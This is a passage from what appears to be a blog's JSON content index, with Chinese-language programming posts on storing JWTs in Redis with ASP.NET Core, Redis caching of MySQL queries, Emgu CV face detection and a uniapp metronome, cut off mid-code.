.url-body:hover{transform:translateY(-6px);-webkit-transform:translateY(-6px);-moz-transform:translateY(-6px);box-shadow:0 26px 40px -24px rgba(0,36,100,.3);-webkit-box-shadow:0 26px 40px -24px rgba(0,36,100,.3);-moz-box-shadow:0 26px 40px -24px rgba(0,36,100,.3)} .url-card .url-like{position:absolute;top:5px;right:10px;opacity:0;transition:opacity .3s} .url-card .url-body:hover .url-like{opacity:1} .url-card .url-info{overflow:hidden;padding-right:5px} .url-card .url-goto-after{height:24px;border-top:1px solid rgba(136,136,136,.2)} .url-card .url-goto{position:absolute;bottom:0;left:0px;right:0} .url-card .card-body{padding:.938rem} .url-card .url-img{width:120px;height:100px;-webkit-box-flex:0;-ms-flex:none;flex:none;background:rgba(255, 255, 255, 0);display:flex;align-items:center;overflow:hidden} .url-card .url-img>img{max-height:100%;vertical-align:unset} .url-card .max .url-img{width:60px;height:60px} .url-card .mini .url-img{width:25px;height:25px} .url-card .post-min .url-img{width:20px;height:20px} .url-card .post-min .url-img>img{vertical-align:unset} .url-card.wechat a.card:after{content:'\\e60d';position:absolute;display:inline-block;font-family:\"iconfont\";font-size:66px;color:#888;margin-left:10px;bottom:-15px;right:10px;opacity:.15} .url-card.down a.card:after{content:'\\e604';position:absolute;display:inline-block;font-family:\"iconfont\";font-size:60px;color:#888;margin-left:10px;bottom:-10px;right:10px;opacity:.15} .url-card.down .mini a.card:after,.url-card.wechat .mini a.card:after{font-size:30px;margin-left:10px;bottom:-5px;right:10px} .url-card.down .max a.card:after,.url-card.wechat .max a.card:after{font-size:30px;bottom:25px} .url-card .mini a.togo,.url-card .default a.togo{position:absolute;top:20px;right:0;width:30px;height:30px;line-height:30px;opacity:.2;transition:opacity .3s} .url-card .mini a.togo{top:4px} .url-card .url-body:hover a.togo{opacity:1} .url-card .max a.togo{margin-left:auto} .url-card .max .tga{width:calc(100% - 15px);overflow:hidden} .url-card .max .tga a{font-size:75%;padding:.125rem .4rem;background:rgba(134,134,134,.1);color:#888;border-radius:10px;transition:.3s} .url-card .max .tga a:not(.no-tag):hover{background:#f1404b;color:#fff} .home-like{cursor:pointer} .home-like:hover{color:#f1404b} .home-like-hide{opacity:0!important;transform:scale(3) translateY(-25px)!important} .url-card a.togo:hover i{text-shadow:0 0 5px} .panel-body .url-card.shortcode-url .card{background:rgba(136,136,136,.1)} .url-card .remove-site,.url-card .remove-cm-site{position:absolute;top:-8px;right:0;font-size:20px;color:#f1404b;line-height:20px} .url-card .mini .card-body{padding:0.4rem 0.5rem} .edit .url-card.sortable{cursor:move} .edit .url-card.sortable .url-body a{pointer-events:none} .edit .url-card.sortable .url-body:hover{transform:initial;box-shadow:initial} .article-entry p, .article-entry table{margin:0} .keep-markdown-body a{ border-bottom: 0rem solid var(--text-color-4);} .mb-4{flex-direction: row-reverse;} .keep-markdown-body img{box-shadow:0 0 0xrem var(--shadow-color)} .post-content-container .border-box{background:#B6E0F9;}","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"Navigation","slug":"Navigation","permalink":"https://banjinmei.github.io/tags/Navigation/"},{"name":"nav","slug":"nav","permalink":"https://banjinmei.github.io/tags/nav/"}],"author":"mu"},{"title":"jwt redis","slug":"jwt-redis","date":"2024-12-02T17:20:03.000Z","updated":"2024-12-03T18:10:52.214Z","comments":true,"path":"2024/12/03/jwt-redis/","permalink":"https://banjinmei.github.io/2024/12/03/jwt-redis/","excerpt":"","text":"Redis JWT在 .NET 中使用 Redis 来存储 JWT（JSON Web Token）可以通过多种方式实现，例如在用户登录时将生成的 JWT 存储在 Redis 中以便于后续验证和管理。 实现步骤 引入依赖确保你的项目引入了以下必要的 NuGet 包： Microsoft.AspNetCore.Authentication.JwtBearer：用于 JWT 身份验证。StackExchange.Redis：用于与 Redis 通信。 12dotnet add package Microsoft.AspNetCore.Authentication.JwtBearerdotnet add package StackExchange.Redis 配置 Redis 客户端设置 Redis 的连接和操作。 生成 JWT根据用户信息生成 JWT 并将其存储到 Redis。 验证 JWT在验证阶段从 Redis 检查 token 是否有效。 实现 Token 的失效机制利用 Redis 的 TTL（过期时间）特性来管理 token 的生命周期。 代码实现1. 配置 Redis 客户端在 Program.cs 或 Startup.cs 中配置 Redis 和 JWT 身份验证： 1234567891011121314151617181920212223242526272829303132333435using Microsoft.AspNetCore.Authentication.JwtBearer;using Microsoft.Extensions.DependencyInjection;using Microsoft.IdentityModel.Tokens;using StackExchange.Redis;using System.Text;var builder = WebApplication.CreateBuilder(args);// Redis 配置builder.Services.AddSingleton&lt;IConnectionMultiplexer&gt;(sp =&gt; ConnectionMultiplexer.Connect(&quot;localhost:6379&quot;)); // 替换为你的 Redis 地址// JWT 配置var key = &quot;YourSecretKeyForJwt&quot;; // 替换为你的密钥builder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme) .AddJwtBearer(options =&gt; &#123; options.TokenValidationParameters = new TokenValidationParameters &#123; ValidateIssuerSigningKey = true, IssuerSigningKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(key)), ValidateIssuer = false, ValidateAudience = false &#125;; &#125;);builder.Services.AddAuthorization();var app = builder.Build();app.UseAuthentication();app.UseAuthorization();app.MapControllers();app.Run(); 2. 生成和存储 JWT在 Controller 中生成 JWT 并将其存储到 Redis。 1234567891011121314151617181920212223242526272829303132333435363738394041424344using Microsoft.AspNetCore.Mvc;using Microsoft.IdentityModel.Tokens;using StackExchange.Redis;using System.IdentityModel.Tokens.Jwt;using System.Security.Claims;using System.Text;[ApiController][Route(&quot;api/[controller]&quot;)]public class AuthController : ControllerBase&#123; private readonly IConnectionMultiplexer _redis; private readonly string _jwtKey = &quot;YourSecretKeyForJwt&quot;; // 替换为你的密钥 public AuthController(IConnectionMultiplexer redis) &#123; _redis = redis; &#125; [HttpPost(&quot;login&quot;)] public IActionResult Login(string username) &#123; // 创建 JWT token var claims = new[] &#123; new Claim(ClaimTypes.Name, username) &#125;; var key = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(_jwtKey)); var creds = new SigningCredentials(key, SecurityAlgorithms.HmacSha256); var token = new JwtSecurityToken( claims: claims, expires: DateTime.UtcNow.AddHours(1), signingCredentials: creds); var jwt = new JwtSecurityTokenHandler().WriteToken(token); // 将 token 存储到 Redis var db = _redis.GetDatabase(); db.StringSet($&quot;jwt:&#123;username&#125;&quot;, jwt, TimeSpan.FromHours(1)); return Ok(new &#123; token = jwt &#125;); &#125;&#125; 3. 验证 JWT在中间件或验证逻辑中从 Redis 检查 JWT 是否有效。 123456789101112131415161718[HttpGet(&quot;validate&quot;)]public IActionResult ValidateToken()&#123; var authHeader = Request.Headers[&quot;Authorization&quot;].ToString(); if (string.IsNullOrEmpty(authHeader) || !authHeader.StartsWith(&quot;Bearer &quot;)) return Unauthorized(); var token = authHeader.Replace(&quot;Bearer &quot;, &quot;&quot;); var username = User.Identity?.Name; var db = _redis.GetDatabase(); var storedToken = db.StringGet($&quot;jwt:&#123;username&#125;&quot;); if (storedToken.IsNullOrEmpty || storedToken != token) return Unauthorized(); return Ok(&quot;Token is valid&quot;);&#125; 4. Token 失效机制利用 Redis 的 TTL 设置 token 的自动过期： 在存储 token 时设置过期时间。用户注销时可以手动删除 Redis 中的 token。注销示例： 12345678[HttpPost(&quot;logout&quot;)]public IActionResult Logout()&#123; var username = User.Identity?.Name; var db = _redis.GetDatabase(); db.KeyDelete($&quot;jwt:&#123;username&#125;&quot;); return Ok(&quot;Logged out&quot;);&#125; 总结通过 Redis 存储 JWT，可以实现以下功能： 集中管理 JWT：便于实时撤销或查询。自动过期：Redis 自带 TTL，可以简化 token 的管理。扩展性好：适用于分布式系统。根据实际需求，还可以扩展功能，例如黑名单机制或支持多设备登录等。 redis缓存json RedisHelper方法添加 Redis 缓存，可以通过以下方式扩展代码： 实现思路定义 Redis 缓存逻辑： 先尝试从 Redis 缓存中读取数据。如果缓存命中，则直接返回数据。如果缓存未命中，则查询数据库，处理数据后存入 Redis，并设置适当的过期时间。定义 Redis 键： 使用一个唯一键，例如 **CityInfoList:{id}**，确保缓存区分不同 id 的数据。序列化和反序列化： 使用 JSON 格式存储数据，方便跨语言和跨系统的兼容性。扩展后的代码以下是添加 Redis 缓存后的完整实现： 123456789101112131415161718192021222324252627282930313233343536public List&lt;CityInfoS&gt; FindIMCityInfoListByPIDS(string id)&#123; // 定义 Redis 缓存键 string redisKey = $&quot;IMCityInfoList:&#123;id&#125;&quot;; // 尝试从 Redis 获取数据 string cachedData = RedisHelper.GetString(redisKey); // RedisHelper 是 Redis 操作工具类 if (!string.IsNullOrEmpty(cachedData)) &#123; // 如果缓存命中，反序列化并返回数据 return JsonConvert.DeserializeObject&lt;List&lt;IMCityInfoS&gt;&gt;(cachedData); &#125; // 缓存未命中，从数据库查询 string sql = @&quot;SELECT `CtId`, `Pid`, `PidS`, `CityCode`, `CityName`, `PostCode`, `AreaCode`, `Ctime`, `CtimeInt`, `LangType`, `HasSon` FROM `IMCityInfoS` WHERE PID = @PID&quot;; var parameters = new MySqlParameter[] &#123; new MySqlParameter(&quot;@PID&quot;, id) &#125;; DataSet ds = DbHelperMySQL.Query(sql, parameters); if (ds != null &amp;&amp; ds.Tables[0].Rows.Count &gt; 0) &#123; // 转换查询结果为 JSON string json = JsonConvert.SerializeObject(ds.Tables[0]); // 设置缓存并指定过期时间（例如30分钟） RedisHelper.SetString(redisKey, json, TimeSpan.FromMinutes(30)); // 反序列化为对象列表并返回 return JsonConvert.DeserializeObject&lt;List&lt;IMCityInfoS&gt;&gt;(json); &#125; // 如果查询无结果，返回空 return null;&#125; RedisHelper 工具类如果你尚未实现 RedisHelper，可以参考以下示例代码： 1234567891011121314151617181920using StackExchange.Redis;using System;public static class RedisHelper&#123; private static readonly ConnectionMultiplexer redis = ConnectionMultiplexer.Connect(&quot;localhost&quot;); // 替换为你的 Redis 地址 private static readonly IDatabase db = redis.GetDatabase(); // 获取字符串数据 public static string GetString(string key) &#123; return db.StringGet(key); &#125; // 设置字符串数据并指定过期时间 public static void SetString(string key, string value, TimeSpan? expiry = null) &#123; db.StringSet(key, value, expiry); &#125;&#125; 使用注意事项Redis 连接池：实际生产中，建议使用 Redis 连接池来管理连接，避免连接过多导致资源占用。异常处理：在 Redis 读写操作中，添加异常捕获逻辑，确保即使 Redis 出现问题，也不会影响数据库查询。过期时间：根据业务需求设置合理的过期时间，避免缓存数据过期或无效。","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"jwt","slug":"jwt","permalink":"https://banjinmei.github.io/tags/jwt/"},{"name":"token","slug":"token","permalink":"https://banjinmei.github.io/tags/token/"},{"name":"redis","slug":"redis","permalink":"https://banjinmei.github.io/tags/redis/"}],"author":"mu"},{"title":"cashrp opencv","slug":"cashrp-opencv","date":"2024-12-02T17:15:38.000Z","updated":"2024-12-02T17:17:14.106Z","comments":true,"path":"2024/12/03/cashrp-opencv/","permalink":"https://banjinmei.github.io/2024/12/03/cashrp-opencv/","excerpt":"","text":"Emgu CV进行基本的人脸检测。人脸检测是指定位图像中的人脸位置，而人脸识别是指确认或验证这些脸孔的身份。为了实现人脸识别，需要训练一个模型，或者使用预训练的模型。 安装 Emgu CV首先，需要通过NuGet安装Emgu CV包。可以通过Visual Studio的NuGet包管理器来安装： 打开的C#项目。右键点击解决方案资源管理器中的项目名称，选择“管理NuGet程序包”。 搜索并安装Emgu.CV和Emgu.CV.runtime.windows。12345678910111213141516171819202122// 加载人脸检测分类器CascadeClassifier faceCascade = new CascadeClassifier(&quot;haarcascade_frontalface_default.xml&quot;);// 读取输入图像Image&lt;Bgr, byte&gt; inputImage = new Image&lt;Bgr, byte&gt;(&quot;face.jpg&quot;);// 转换为灰度图像，因为人脸检测通常在灰度图像上进行Image&lt;Gray, byte&gt; grayImage = inputImage.Convert&lt;Gray, byte&gt;();// 进行人脸检测Rectangle[] faces = faceCascade.DetectMultiScale(grayImage, 1.1, 3, Size.Empty);// 在检测到的人脸周围绘制矩形框foreach (Rectangle face in faces)&#123; inputImage.Draw(face, new Bgr(0, 255, 0), 3);&#125;// 保存标记后的图像为output.jpginputImage.Save(&quot;output.jpg&quot;); Console.WriteLine(&quot;save~output.jpg&quot;); xml来自 https://github.com/opencv/opencv/tree/master/data/haarcascades runtime如果没有 Emgu.CV.runtime.windows 则会加载不了xml Exception ：System.TypeInitializationException:“The type initializer for ‘Emgu.CV.CvInvoke’ threw an exception.” 检查运行时依赖 (opencv_world*.dll) 是否加载正确。安装最新的 VC++ Redistributable。确保项目目标平台与 Emgu.CV 的依赖项一致。 识别猫脸1234567891011121314151617181920212223// 加载检测分类器CascadeClassifier faceCascade = new CascadeClassifier(&quot;haarcascade_frontalcatface.xml&quot;);// 读取输入图像Image&lt;Bgr, byte&gt; inputImage = new Image&lt;Bgr, byte&gt;(&quot;cat2.jpg&quot;);// 转换为灰度图像，因为人脸检测通常在灰度图像上进行Image&lt;Gray, byte&gt; grayImage = inputImage.Convert&lt;Gray, byte&gt;();// 进行人脸检测Rectangle[] faces = faceCascade.DetectMultiScale(grayImage, 1.1, 3, Size.Empty);// 在检测到的人脸周围绘制矩形框foreach (Rectangle face in faces)&#123; inputImage.Draw(face, new Bgr(0, 255, 0), 3);&#125;// 保存标记后的图像为output.jpginputImage.Save(&quot;output.jpg&quot;);Console.WriteLine(&quot;save~output.jpg&quot;);","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"},{"name":"csharp","slug":"csharp","permalink":"https://banjinmei.github.io/tags/csharp/"},{"name":"opencv","slug":"opencv","permalink":"https://banjinmei.github.io/tags/opencv/"},{"name":"emgu","slug":"emgu","permalink":"https://banjinmei.github.io/tags/emgu/"}],"author":"mu"},{"title":"uniapp 节拍器","slug":"uniapp-节拍器","date":"2024-12-02T17:12:19.000Z","updated":"2024-12-02T17:15:14.529Z","comments":true,"path":"2024/12/03/uniapp-节拍器/","permalink":"https://banjinmei.github.io/2024/12/03/uniapp-%E8%8A%82%E6%8B%8D%E5%99%A8/","excerpt":"","text":"节拍器基础功能加速 前速 启动 暂停 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152&lt;template&gt; &lt;view class=&quot;container&quot;&gt; &lt;!-- 节拍显示 --&gt; &lt;view class=&quot;label&quot;&gt;节拍：&lt;text class=&quot;value&quot;&gt;&#123;&#123; beat &#125;&#125;&lt;/text&gt;&lt;/view&gt; &lt;!-- 滑块定义节拍数 --&gt; &lt;slider class=&quot;slider&quot; min=&quot;1&quot; max=&quot;10&quot; step=&quot;1&quot; value=&quot;&#123;&#123; beat &#125;&#125;&quot; @change=&quot;handleBeatChange&quot; &gt;&lt;/slider&gt; &lt;!-- 速度显示 --&gt; &lt;view class=&quot;label&quot;&gt;速度：&lt;text class=&quot;value&quot;&gt;&#123;&#123; speed &#125;&#125; BPM&lt;/text&gt;&lt;/view&gt; &lt;!-- 增加速度按钮 --&gt; &lt;view class=&quot;button-group&quot;&gt; &lt;button class=&quot;button&quot; @click=&quot;increaseSpeed&quot;&gt;加速&lt;/button&gt; &lt;button class=&quot;button&quot; @click=&quot;decreaseSpeed&quot;&gt;减速&lt;/button&gt; &lt;/view&gt; &lt;!-- 播放/停止按钮 --&gt; &lt;button class=&quot;play-button&quot; @click=&quot;togglePlay&quot;&gt; &#123;&#123; playStatus === &#x27;playing&#x27; ? &#x27;停止&#x27; : &#x27;播放&#x27; &#125;&#125; &lt;/button&gt; &lt;/view&gt;&lt;/template&gt;&lt;script&gt;export default &#123; data() &#123; return &#123; beat: 4, // 初始节拍数 speed: 60, // 初始速度（每分钟节拍数） playStatus: &#x27;stopped&#x27;, // 播放状态，初始为停止 intervalId: null, // 用于存储定时器ID audioContext: null, // 音频上下文 &#125;; &#125;, methods: &#123; // 初始化音频上下文 initAudio() &#123; if (!this.audioContext) &#123; this.audioContext = uni.createInnerAudioContext(); this.audioContext.src = &#x27;/static/sounds/a1.mp3&#x27;; // 替换为节拍音效文件路径 this.audioContext.volume = 1.0; &#125; &#125;, // 处理滑块改变节拍数的事件 handleBeatChange(event) &#123; this.beat = event.detail.value; &#125;, // 增加速度的方法 increaseSpeed() &#123; this.speed += 10; &#125;, // 减少速度的方法 decreaseSpeed() &#123; this.speed -= 10; if (this.speed &lt; 10) &#123; this.speed = 10; &#125; &#125;, // 切换播放/停止状态的方法 togglePlay() &#123; if (this.playStatus === &#x27;stopped&#x27;) &#123; this.playStatus = &#x27;playing&#x27;; this.initAudio(); this.startMetronome(); &#125; else &#123; this.playStatus = &#x27;stopped&#x27;; this.stopMetronome(); &#125; &#125;, // 启动节拍器的方法，通过定时器播放声音 startMetronome() &#123; const intervalTime = 60000 / this.speed; // 根据速度计算每个节拍的间隔时间（毫秒） this.intervalId = setInterval(() =&gt; &#123; this.audioContext.play(); // 播放音效 &#125;, intervalTime); &#125;, // 停止节拍器的方法 stopMetronome() &#123; clearInterval(this.intervalId); this.intervalId = null; this.audioContext.stop(); // 停止音效 &#125;, &#125;, onUnload() &#123; // 页面卸载时清理音频资源 if (this.audioContext) &#123; this.audioContext.destroy(); &#125; &#125;,&#125;;&lt;/script&gt;&lt;style&gt;.container &#123; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; background-color: #f5f5f5; height: 100vh;&#125;.label &#123; font-size: 18px; font-weight: bold; margin-bottom: 10px; color: #333;&#125;.value &#123; font-size: 16px; color: #007aff;&#125;.slider &#123; width: 90%; margin: 20px 0;&#125;.button-group &#123; display: flex; gap: 10px; margin-bottom: 20px;&#125;.button &#123; background-color: #007aff; color: white; border: none; border-radius: 5px; padding: 10px 20px; font-size: 16px;&#125;.play-button &#123; background-color: #34c759; color: white; border: none; border-radius: 5px; padding: 15px 30px; font-size: 18px;&#125;.play-button:active &#123; background-color: #32a852;&#125;&lt;/style&gt; 处理音频文件 a1 a2https://audiotrimmer.com/cn/ 实时更新节拍音效：滑动滑块 (handleBeatChange) 或点击按钮 (increaseSpeed&#x2F;decreaseSpeed) 时，会立即调用 restartMetronome，停止当前节拍器并重新启动。当播放状态为 stopped 时，仅播放一次节拍音效以便即时反馈。新增 restartMetronome 方法： 停止当前节拍器后，重新启动，以实现动态调整速度和节拍。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172&lt;template&gt; &lt;view class=&quot;container&quot;&gt; &lt;!-- 节拍显示 --&gt; &lt;view class=&quot;label&quot;&gt;节拍：&lt;text class=&quot;value&quot;&gt;&#123;&#123; beat &#125;&#125;&lt;/text&gt;&lt;/view&gt; &lt;!-- 滑块定义节拍数 --&gt; &lt;slider class=&quot;slider&quot; min=&quot;1&quot; max=&quot;10&quot; step=&quot;1&quot; value=&quot;&#123;&#123; beat &#125;&#125;&quot; @change=&quot;handleBeatChange&quot; &gt;&lt;/slider&gt; &lt;!-- 速度显示 --&gt; &lt;view class=&quot;label&quot;&gt;速度：&lt;text class=&quot;value&quot;&gt;&#123;&#123; speed &#125;&#125; BPM&lt;/text&gt;&lt;/view&gt; &lt;!-- 增加/减少速度按钮 --&gt; &lt;view class=&quot;button-group&quot;&gt; &lt;button class=&quot;button&quot; @click=&quot;increaseSpeed&quot;&gt;加速&lt;/button&gt; &lt;button class=&quot;button&quot; @click=&quot;decreaseSpeed&quot;&gt;减速&lt;/button&gt; &lt;/view&gt; &lt;!-- 播放/停止按钮 --&gt; &lt;button class=&quot;play-button&quot; @click=&quot;togglePlay&quot;&gt; &#123;&#123; playStatus === &#x27;playing&#x27; ? &#x27;停止&#x27; : &#x27;播放&#x27; &#125;&#125; &lt;/button&gt; &lt;/view&gt;&lt;/template&gt;&lt;script&gt;export default &#123; data() &#123; return &#123; beat: 4, // 初始节拍数 speed: 60, // 初始速度（每分钟节拍数） playStatus: &#x27;stopped&#x27;, // 播放状态，初始为停止 intervalId: null, // 用于存储定时器ID audioContext: null, // 音频上下文 &#125;; &#125;, methods: &#123; // 初始化音频上下文 initAudio() &#123; if (!this.audioContext) &#123; this.audioContext = uni.createInnerAudioContext(); this.audioContext.src = &#x27;/static/sounds/a1.mp3&#x27;; // 替换为节拍音效文件路径 this.audioContext.volume = 1.0; &#125; &#125;, // 处理滑块改变节拍数的事件 handleBeatChange(event) &#123; this.beat = event.detail.value; if (this.playStatus === &#x27;playing&#x27;) &#123; this.restartMetronome(); &#125; else &#123; this.audioContext.play(); // 播放一次音效 &#125; &#125;, // 增加速度的方法 increaseSpeed() &#123; this.speed += 5; if (this.playStatus === &#x27;playing&#x27;) &#123; this.restartMetronome(); &#125; else &#123; this.audioContext.play(); // 播放一次音效 &#125; &#125;, // 减少速度的方法 decreaseSpeed() &#123; this.speed -= 5; if (this.speed &lt; 5) &#123; this.speed = 5; &#125; if (this.playStatus === &#x27;playing&#x27;) &#123; this.restartMetronome(); &#125; else &#123; this.audioContext.play(); // 播放一次音效 &#125; &#125;, // 切换播放/停止状态的方法 togglePlay() &#123; if (this.playStatus === &#x27;stopped&#x27;) &#123; this.playStatus = &#x27;playing&#x27;; this.initAudio(); this.startMetronome(); &#125; else &#123; this.playStatus = &#x27;stopped&#x27;; this.stopMetronome(); &#125; &#125;, // 启动节拍器的方法，通过定时器播放声音 startMetronome() &#123; const intervalTime = 60000 / this.speed; // 根据速度计算每个节拍的间隔时间（毫秒） this.intervalId = setInterval(() =&gt; &#123; this.audioContext.play(); // 播放音效 &#125;, intervalTime); &#125;, // 停止节拍器的方法 stopMetronome() &#123; clearInterval(this.intervalId); this.intervalId = null; &#125;, // 重启节拍器（用于更新速度或节拍） restartMetronome() &#123; this.stopMetronome(); // 先停止当前节拍器 this.startMetronome(); // 再重新启动 &#125;, &#125;, onUnload() &#123; // 页面卸载时清理音频资源 if (this.audioContext) &#123; this.audioContext.destroy(); &#125; &#125;,&#125;;&lt;/script&gt;&lt;style&gt;.container &#123; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; background-color: #f5f5f5; height: 100vh;&#125;.label &#123; font-size: 18px; font-weight: bold; margin-bottom: 10px; color: #333;&#125;.value &#123; font-size: 16px; color: #007aff;&#125;.slider &#123; width: 90%; margin: 20px 0;&#125;.button-group &#123; display: flex; gap: 10px; margin-bottom: 20px;&#125;.button &#123; background-color: #007aff; color: white; border: none; border-radius: 5px; padding: 10px 20px; font-size: 16px;&#125;.play-button &#123; background-color: #34c759; color: white; border: none; border-radius: 5px; padding: 15px 30px; font-size: 18px;&#125;.play-button:active &#123; background-color: #32a852;&#125;&lt;/style&gt; 区分第一拍&#x2F;其余拍123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203&lt;template&gt; &lt;view class=&quot;container&quot;&gt; &lt;!-- 节拍显示 --&gt; &lt;view class=&quot;label&quot;&gt;节拍：&lt;text class=&quot;value&quot;&gt;&#123;&#123; beat &#125;&#125;&lt;/text&gt;&lt;/view&gt; &lt;!-- 滑块定义节拍数 --&gt; &lt;slider class=&quot;slider&quot; min=&quot;1&quot; max=&quot;10&quot; step=&quot;1&quot; value=&quot;&#123;&#123; beat &#125;&#125;&quot; @change=&quot;handleBeatChange&quot; &gt;&lt;/slider&gt; &lt;!-- 速度显示 --&gt; &lt;view class=&quot;label&quot;&gt;速度：&lt;text class=&quot;value&quot;&gt;&#123;&#123; speed &#125;&#125; BPM&lt;/text&gt;&lt;/view&gt; &lt;!-- 增加/减少速度按钮 --&gt; &lt;view class=&quot;button-group&quot;&gt; &lt;button class=&quot;button&quot; @click=&quot;increaseSpeed&quot;&gt;加速&lt;/button&gt; &lt;button class=&quot;button&quot; @click=&quot;decreaseSpeed&quot;&gt;减速&lt;/button&gt; &lt;/view&gt; &lt;!-- 播放/停止按钮 --&gt; &lt;button class=&quot;play-button&quot; @click=&quot;togglePlay&quot;&gt; &#123;&#123; playStatus === &#x27;playing&#x27;? &#x27;停止&#x27; : &#x27;播放&#x27; &#125;&#125; &lt;/button&gt; &lt;/view&gt;&lt;/template&gt;&lt;script&gt;export default &#123; data() &#123; return &#123; beat: 4, // 初始节拍数 speed: 60, // 初始速度（每分钟节拍数） playStatus: &#x27;stopped&#x27;, // 播放状态，初始为停止 intervalId: null, // 用于存储定时器ID audioContext: null, // 音频上下文 &#125;; &#125;, methods: &#123; // 初始化音频上下文 initAudio() &#123; if (!this.audioContext) &#123; this.audioContext = uni.createInnerAudioContext(); // 先不设置具体音频源，后续根据节拍播放不同音频 this.audioContext.volume = 1.0; &#125; &#125;, // 处理滑块改变节拍数的事件 handleBeatChange(event) &#123; this.beat = event.detail.value; if (this.playStatus === &#x27;playing&#x27;) &#123; this.restartMetronome(); &#125; else &#123; // 根据节拍数播放一次相应音频 if (this.beat === 4) &#123; this.audioContext.src = &#x27;/static/sounds/a2.mp3&#x27;; this.audioContext.play(); &#125; else &#123; this.audioContext.src = &#x27;/static/sounds/a3.mp3&#x27;; this.audioContext.play(); &#125; &#125; &#125;, // 增加速度的方法 increaseSpeed() &#123; this.speed += 5; if (this.playStatus === &#x27;playing&#x27;) &#123; this.restartMetronome(); &#125; else &#123; // 根据节拍数播放一次相应音频 if (this.beat === 4) &#123; this.audioContext.src = &#x27;/static/sounds/a2.mp3&#x27;; this.audioContext.play(); &#125; else &#123; this.audioContext.src = &#x27;/static/sounds/a3.mp3&#x27;; this.audioContext.play(); &#125; &#125; &#125;, // 减少速度的方法 decreaseSpeed() &#123; this.speed -= 5; if (this.speed &lt; 5) &#123; this.speed = 5; &#125; if (this.playStatus === &#x27;playing&#x27;) &#123; this.restartMetronome(); &#125; else &#123; // 根据节拍数播放一次相应音频 if (this.beat === 4) &#123; this.audioContext.src = &#x27;/static/sounds/a2.mp3&#x27;; this.audioContext.play(); &#125; else &#123; this.audioContext.src = &#x27;/static/sounds/a3.mp3&#x27;; this.audioContext.play(); &#125; &#125; &#125;, // 切换播放/停止状态的方法 togglePlay() &#123; if (this.playStatus === &#x27;stopped&#x27;) &#123; this.playStatus = &#x27;playing&#x27;; this.initAudio(); this.startMetronome(); &#125; else &#123; this.playStatus = &#x27;stopped&#x27;; this.stopMetronome(); &#125; &#125;, // 启动节拍器的方法，通过定时器播放声音 startMetronome() &#123; const intervalTime = 60000 / this.speed; // 根据速度计算每个节拍的间隔时间（毫秒） let currentBeat = 1; this.intervalId = setInterval(() =&gt; &#123; if (this.beat === 4 &amp;&amp; currentBeat === 1) &#123; this.audioContext.src = &#x27;/static/sounds/a2.mp3&#x27;; &#125; else &#123; this.audioContext.src = &#x27;/static/sounds/a3.mp3&#x27;; &#125; this.audioContext.play(); if (currentBeat === this.beat) &#123; currentBeat = 1; &#125; else &#123; currentBeat++; &#125; &#125;, intervalTime); &#125;, // 停止节拍器的方法 stopMetronome() &#123; clearInterval(this.intervalId); this.intervalId = null; &#125;, // 重启节拍器（用于更新速度或节拍） restartMetronome() &#123; this.stopMetronome(); // 先停止当前节拍器 this.startMetronome(); // 再重新启动 &#125;, &#125;, onUnload() &#123; // 页面卸载时清理音频资源 if (this.audioContext) &#123; this.audioContext.destroy(); &#125; &#125;,&#125;;&lt;/script&gt;&lt;style&gt;.container &#123; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; background-color: #f5f5f5; height: 100vh;&#125;.label &#123; font-size: 18px; font-weight: bold; margin-bottom: 10px; color: #333;&#125;.value &#123; font-size: 16px; color: #007aff;&#125;.slider &#123; width: 90%; margin: 20px 0;&#125;.button-group &#123; display: flex; gap: 10px; margin-bottom: 20px;&#125;.button &#123; background-color: #007aff; color: white; border: none; border-radius: 5px; padding: 10px 20px; font-size: 16px;&#125;.play-button &#123; background-color: #34c759; color: white; border: none; border-radius: 5px; padding: 15px 30px; font-size: 18px;&#125;.play-button:active &#123; background-color: #32a852;&#125;&lt;/style&gt; 实现长按 + -0123456&lt;button class=&quot;button&quot; @click=&quot;increaseSpeed&quot; @longpress=&quot;startIncreaseSpeedLongPress&quot; @longpressend=&quot;stopSpeedLongPress&quot; &gt; 123456789101112131415// 长按开始handleLongPressStart(action) &#123; this.longPressTimer = setInterval(() =&gt; &#123; if (action === &#x27;increase&#x27;) &#123; this.increaseSpeed(); &#125; else if (action === &#x27;decrease&#x27;) &#123; this.decreaseSpeed(); &#125; &#125;, 100); // 每100ms触发一次&#125;,// 长按结束handleLongPressEnd() &#123; clearInterval(this.longPressTimer); this.longPressTimer = null;&#125;, 完整 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232&lt;template&gt; &lt;view class=&quot;container&quot;&gt; &lt;!-- 节拍显示 --&gt; &lt;view class=&quot;label&quot;&gt;节拍：&lt;text class=&quot;value&quot;&gt;&#123;&#123; beat 